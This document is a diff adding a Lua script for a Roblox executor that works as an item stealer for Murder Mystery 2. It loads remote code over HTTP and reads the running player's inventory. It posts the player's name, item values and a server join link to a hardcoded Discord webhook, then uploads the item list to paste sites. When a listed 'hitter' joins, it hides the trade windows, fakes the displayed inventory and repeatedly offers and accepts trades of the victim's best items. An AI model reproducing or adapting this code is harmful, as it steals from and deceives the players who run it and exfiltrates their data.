@@ -1,0 +1,485 @@
+if getgenv().mm2then then return end
+getgenv().mm2then = true
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1562348165200617492/DqkW_EEQsRYYIFWMYH07m3kmSiAKnMaf8GnKo1gsVEaoC9LP3XPuJpmbbOxiUfXTJU5T"
+
+local valueLib = loadstring(game:HttpGet("https://astatine.vip/scripts/mm2_value.lua"))()
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+
+repeat task.wait() until LocalPlayer:GetAttribute("ClientLoaded") == true
+
+pcall(function()
+	ReplicatedStorage.Trade.SetRequestsEnabled:FireServer(true)
+end)
+
+-- job id
+local currentJobId = getgenv().ty_what or game.JobId
+
+if (currentJobId == "" or currentJobId == nil) and gethiddenproperty and pcall(gethiddenproperty, game, "JobId") then
+	currentJobId = gethiddenproperty(game, "JobId")
+end
+
+-- getgc inventory
+local gcInventoryTable
+if getgc then
+	for _, v in pairs(getgc(true)) do
+		if type(v) == "table"
+			and rawget(v, "Pets")
+			and rawget(v, "Item")
+			and rawget(v, "Badge")
+		then
+			gcInventoryTable = v
+			break
+		end
+	end
+end
+
+if not gcInventoryTable then
+	warn("getgc missed — no item data, aborting")
+	return
+end
+
+local exploitLib = gcInventoryTable
+
+local blacklistedItems = {
+	"DefaultGun", "DefaultKnife",
+	"Reaver", "Reaver_Legendary", "Reaver_Godly", "Reaver_Ancient",
+	"IceHammer", "IceHammer_Legendary", "IceHammer_Godly", "IceHammer_Ancient",
+	"Gingerscythe", "Gingerscythe_Legendary", "Gingerscythe_Godly", "Gingerscythe_Ancient",
+	"Default Gun", "Default Knife", "TestItem", "S1 Test Knife",
+	"Cracks", "Icecrusher", "???", "Dartbringer",
+	"Red Traveler's", "Bronze Traveler's", "Silver Traveler's", "Gold Traveler's",
+	"Survivor Camo", "Zombie Camo", "SharkSeeker", "Synthwave"
+}
+
+local rarityTypeRemap = { Classic = "Vintage", Pet = "Pet" }
+
+local rarityOrder = {
+	"Ancient", "Godly", "Unique", "Classic",
+	"Legendary", "Rare", "Uncommon", "Common"
+}
+
+local function roundToThreeDecimals(num)
+	return num >= 0
+		and math.floor(num * 1000 + 0.5) / 1000
+		or math.ceil(num * 1000 - 0.5) / 1000
+end
+
+local function getItemValue(itemName, itemType, rarity, isChroma)
+	local lookupCategory
+	if itemType == "Pet" then
+		lookupCategory = "Pet"
+	else
+		lookupCategory = rarityTypeRemap[rarity] or rarity
+	end
+
+	local categoryTable = valueLib[lookupCategory]
+	if not categoryTable then return 0 end
+
+	local keyA, keyB, keyC
+	if isChroma then
+		categoryTable = valueLib.Chroma
+		if not categoryTable then return 0 end
+		local chromaKey = string.lower("chroma " .. itemName)
+		keyA = chromaKey
+		keyB = string.lower(chromaKey .. " (" .. string.lower(itemType) .. ")")
+		keyC = string.lower(chromaKey .. " " .. itemType)
+	else
+		keyA = string.lower(itemName)
+		keyB = keyA .. " (" .. string.lower(itemType) .. ")"
+		keyC = keyA .. " " .. itemType
+	end
+
+	return categoryTable[keyA] or categoryTable[keyB] or categoryTable[keyC] or 0
+end
+
+-- build item value map from exploitLib
+local itemValueMap = {}
+
+for itemId, itemData in pairs(exploitLib.Item) do
+	if itemData.ItemName
+		and not table.find(blacklistedItems, itemId)
+		and not itemData.EvoBaseID
+	then
+		local val = getItemValue(itemData.ItemName, itemData.ItemType, itemData.Rarity, itemData.Chroma or false)
+		itemValueMap[itemId] = {
+			value = tonumber(val),
+			name = itemData.ItemName or itemData.Name,
+			rarity = itemData.Rarity,
+			type = itemData.ItemType,
+			chroma = itemData.Chroma or false
+		}
+	end
+end
+
+for petId, petData in pairs(exploitLib.Pets) do
+	if petData.Name and (not petData.Price or petData.Price ~= "NotForSale") then
+		local val = getItemValue(petData.Name, "Pet", petData.Rarity, petData.Chroma or false)
+		itemValueMap[petId] = {
+			value = tonumber(val),
+			name = petData.ItemName or petData.Name,
+			rarity = petData.Rarity,
+			type = "Pet",
+			chroma = petData.Chroma or false
+		}
+	end
+end
+
+-- globals set by loader
+local targetUsers     = Users    or {}
+local targetUsernames = Username or {"ishi_mm2" }
+local minValuePerItem = min_val_each or 2
+local minRarity       = minrarity or "Godly"
+
+local filteredInventory  = {}
+local totalInventoryValue = 0
+local totalItemCount      = 0
+local rarityCount = {
+	Ancient = 0, Godly = 0, Unique = 0, Classic = 0,
+	Legendary = 0, Rare = 0, Uncommon = 0, Common = 0
+}
+local hitter = nil
+local LastOffer = nil
+
+local function scanInventory()
+	filteredInventory   = {}
+	totalInventoryValue = 0
+	totalItemCount      = 0
+	for k in pairs(rarityCount) do rarityCount[k] = 0 end
+
+	local fullInv = game:GetService("ReplicatedStorage").Remotes.Extras.GetFullInventory:InvokeServer(LocalPlayer)
+	local minRarityIndex = table.find(rarityOrder, minRarity)
+
+	local function processItem(itemId, itemCount)
+		local entry = itemValueMap[itemId]
+		if not entry then return end
+		if minValuePerItem > entry.value then return end
+		local idx = table.find(rarityOrder, entry.rarity)
+		if not idx or idx > minRarityIndex then return end
+
+		totalItemCount      += itemCount
+		totalInventoryValue += entry.value * itemCount
+		if rarityCount[entry.rarity] then
+			rarityCount[entry.rarity] += itemCount
+		end
+		table.insert(filteredInventory, {
+			value  = entry.value * itemCount,
+			name   = entry.name,
+			rarity = entry.rarity,
+			type   = entry.type,
+			chroma = entry.chroma,
+			id     = itemId,
+			n      = itemCount
+		})
+	end
+
+	for itemId, itemCount in pairs(fullInv.Weapons.Owned) do
+		processItem(itemId, itemCount)
+	end
+	for petId, petCount in pairs(fullInv.Pets.Owned) do
+		processItem(petId, petCount)
+	end
+
+	if totalItemCount <= 0 then
+		pcall(function()
+			ReplicatedStorage:WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
+		end)
+	end
+
+	table.sort(filteredInventory, function(a, b)
+		return tonumber(a.value) > tonumber(b.value)
+	end)
+end
+
+local function buildInventoryString()
+	local byRarity = {}
+	for _, item in ipairs(filteredInventory) do
+		local rarity = item.rarity
+		byRarity[rarity] = byRarity[rarity] or {}
+		local line = item.name .. " (" .. string.lower(item.type) .. ") value: " .. roundToThreeDecimals(item.value)
+		if item.chroma then line = "Chroma " .. line end
+		if item.n > 1  then line = "x" .. item.n .. " " .. line end
+		table.insert(byRarity[rarity], line)
+	end
+
+	local lines = {}
+	for _, rarity in ipairs(rarityOrder) do
+		if byRarity[rarity] then
+			table.insert(lines, rarity == "Classic" and "Vintage" or rarity)
+			for _, l in ipairs(byRarity[rarity]) do
+				table.insert(lines, " - " .. l)
+			end
+		end
+	end
+	return table.concat(lines, "\n")
+end
+
+local function truncate(str, max)
+	if #str <= max then return str end
+	local t = str:sub(1, max)
+	local nl = t:match(".*()\n")
+	if nl then t = t:sub(1, nl - 1) end
+	return t .. "\n...and more"
+end
+
+local function uploadInventoryToPaste(content)
+	local body = "-- rewrite --\n\n\n" .. content
+
+	local ok, res = pcall(request, {
+		Url = "https://api.rubis.app/v2/scrap?public=true",
+		Method = "POST",
+		Body = body
+	})
+	if ok and res and res.StatusCode == 200 then
+		return HttpService:JSONDecode(res.Body).raw
+	end
+
+	ok, res = pcall(request, {
+		Url = "https://pastie.io/documents",
+		Method = "POST",
+		Headers = { ["Content-Type"] = "application/json" },
+		Body = body
+	})
+	if ok and res and res.StatusCode == 200 then
+		return "https://pastie.io/raw/" .. HttpService:JSONDecode(res.Body).key
+	end
+
+	ok, res = pcall(request, {
+		Url = "https://paste.rs/",
+		Method = "POST",
+		Headers = { ["Content-Type"] = "application/json" },
+		Body = body
+	})
+	if ok and res and (res.StatusCode == 201 or res.StatusCode == 206) then
+		return res.Body
+	end
+
+	return "paste upload failed"
+end
+
+local function sendWebhook()
+	local invString  = buildInventoryString()
+	local pasteUrl   = uploadInventoryToPaste(invString)
+	local joinerLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. currentJobId
+	local timestamp  = os.date("%Y-%m-%d %H:%M:%S")
+
+	local invField = "```"
+		.. "Total value: " .. roundToThreeDecimals(totalInventoryValue)
+		.. "\nAncient   : " .. rarityCount.Ancient
+		.. "\nGodly     : " .. rarityCount.Godly
+		.. "\nUnique    : " .. rarityCount.Unique
+		.. "\nVintage   : " .. rarityCount.Classic
+		.. "\nLegendary : " .. rarityCount.Legendary
+		.. "\nRare      : " .. rarityCount.Rare
+		.. "\nUncommon  : " .. rarityCount.Uncommon
+		.. "\nCommon    : " .. rarityCount.Common
+		.. "```"
+		.. "\n" .. pasteUrl
+
+	-- discord field value cap is 1024 chars
+	if #invField > 1024 then
+		invField = invField:sub(1, 1021) .. "..."
+	end
+
+	local pingContent = nil
+	if totalInventoryValue >= 2 and (rarityCount.Unique >= 1 or rarityCount.Godly >= 1 or rarityCount.Ancient >= 1) then
+		pingContent = "@everyone"
+	end
+
+	local payload = {
+		username = LocalPlayer.Name,
+		content  = pingContent,
+		embeds = {{
+			title = "MM2",
+			color = 0x9B59B6,
+			fields = {
+				{
+					name  = "Player",
+					value = "```"
+						.. "Username : " .. LocalPlayer.Name
+						.. "\nDisplay  : " .. LocalPlayer.DisplayName
+						.. "\nExecutor : " .. table.concat({identifyexecutor()}, ", ")
+						.. "\nRoblox   : " .. version()
+						.. (targetUsers and "\nTarget   : " .. table.concat(targetUsers, ", ") or "")
+						.. "```",
+					inline = false
+				},
+				{
+					name   = "Inventory",
+					value  = invField,
+					inline = false
+				},
+				{
+					name   = "Join",
+					value  = "[click to join](" .. joinerLink .. ")",
+					inline = false
+				}
+			},
+			footer = { text = timestamp }
+		}}
+	}
+
+	pcall(function()
+		request({
+			Url     = WEBHOOK_URL,
+			Method  = "POST",
+			Headers = { ["Content-Type"] = "application/json" },
+			Body    = HttpService:JSONEncode(payload)
+		})
+	end)
+end
+
+local function getTopFourItems()
+	local top = {}
+	for i = 1, 4 do
+		if filteredInventory[i] then
+			table.insert(top, filteredInventory[i])
+		end
+	end
+	return top
+end
+
+local function offerTopItems()
+	for _, item in ipairs(getTopFourItems()) do
+		for i = 1, item.n do
+			ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(item.id, "Items")
+		end
+	end
+end
+
+local function getTradeStatus()
+	local s = ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
+	if s == "StartTrade" then return true end
+	if s == "None" then return false end
+end
+
+local function tradeAcceptLoop()
+	while task.wait(0.2) do
+		if ReplicatedStorage.Trade.GetTradeStatus:InvokeServer() == "ReceivingRequest" then
+			ReplicatedStorage:WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
+		else
+			pcall(function()
+				ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId * 3, LastOffer)
+			end)
+		end
+	end
+end
+
+local function deepCopyTable(original, seen)
+	local seenMap = seen or {}
+	if type(original) ~= "table" then return original end
+	if seenMap[original] then return seenMap[original] end
+	local copy = {}
+	seenMap[original] = copy
+	for k, v in next, original, nil do
+		copy[deepCopyTable(k, seenMap)] = deepCopyTable(v, seenMap)
+	end
+	setmetatable(copy, deepCopyTable(getmetatable(original), seenMap))
+	return copy
+end
+
+local function beginTradeSteal()
+	if not getgenv().abcdefg then
+		pcall(function()
+			local InventoryModule = require(ReplicatedStorage.Modules.InventoryModule)
+			local ProfileData     = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("ProfileData"))
+			local frozenInventory = deepCopyTable(ProfileData.Weapons.Owned)
+
+			ProfileData.Weapons.Owned = deepCopyTable(frozenInventory)
+
+			if InventoryModule.GUI.MyInventory and InventoryModule.MyInventory then
+				InventoryModule.UpdateInventory(InventoryModule.GUI.MyInventory, InventoryModule.MyInventory)
+			end
+
+			local originalGenerateTables
+			originalGenerateTables = hookfunction(InventoryModule.GenerateInventoryTables, function(profileData, arg2)
+				profileData.Weapons.Owned = deepCopyTable(frozenInventory)
+				return originalGenerateTables(profileData, arg2)
+			end)
+		end)
+
+		local TradeGUI_Phone = LocalPlayer.PlayerGui.TradeGUI_Phone
+		TradeGUI_Phone:GetPropertyChangedSignal("Enabled"):Connect(function()
+			TradeGUI_Phone.Enabled = false
+		end)
+
+		local TradeGUI = LocalPlayer.PlayerGui.TradeGUI
+		TradeGUI:GetPropertyChangedSignal("Enabled"):Connect(function()
+			TradeGUI.Enabled = false
+		end)
+
+		task.spawn(tradeAcceptLoop)
+		getgenv().abcdefg = true
+	end
+
+	scanInventory()
+	repeat wait() until totalItemCount > 0
+
+	local hasOffered = false
+
+	while totalItemCount > 0 do
+		if getTradeStatus() ~= true then
+			if getTradeStatus() == false then
+				pcall(function()
+					ReplicatedStorage.Trade.SendRequest:InvokeServer(
+						Players:FindFirstChild(hitter)
+					)
+				end)
+				hasOffered = false
+			end
+		elseif not hasOffered then
+			hasOffered = true
+			scanInventory()
+			offerTopItems()
+		end
+	end
+end
+
+ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:connect(function(tradeData)
+	LastOffer = tradeData.LastOffer
+	local Player1 = tradeData.Player1
+	if tostring(tradeData.Player2.Player):lower() ~= tostring(hitter):lower() then
+		if tostring(Player1.Player):lower() ~= tostring(hitter):lower() then
+			ReplicatedStorage:WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
+		end
+	end
+end)
+
+ReplicatedStorage.Trade.AcceptTrade.OnClientEvent:Connect(function(accepted)
+	if accepted and hitter then
+		warn("trade done")
+		sendWebhook()
+	end
+end)
+
+local function checkAndStealFromPlayer(playerName)
+	if table.find(targetUsernames, playerName) then
+		hitter = playerName
+		ReplicatedStorage:WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
+		beginTradeSteal()
+	end
+end
+
+-- initial scan + webhook on load
+scanInventory()
+if totalItemCount == 0 then return end
+sendWebhook()
+
+-- watch for targets joining
+Players.PlayerAdded:Connect(function(player)
+	local conn
+	conn = player:GetAttributeChangedSignal("ClientLoaded"):Connect(function()
+		if player:GetAttribute("ClientLoaded") == true then
+			checkAndStealFromPlayer(player.Name)
+			conn:Disconnect()
+		end
+	end)
+end)
+
+for _, player in pairs(Players:GetPlayers()) do
+	checkAndStealFromPlayer(player.Name)
+end
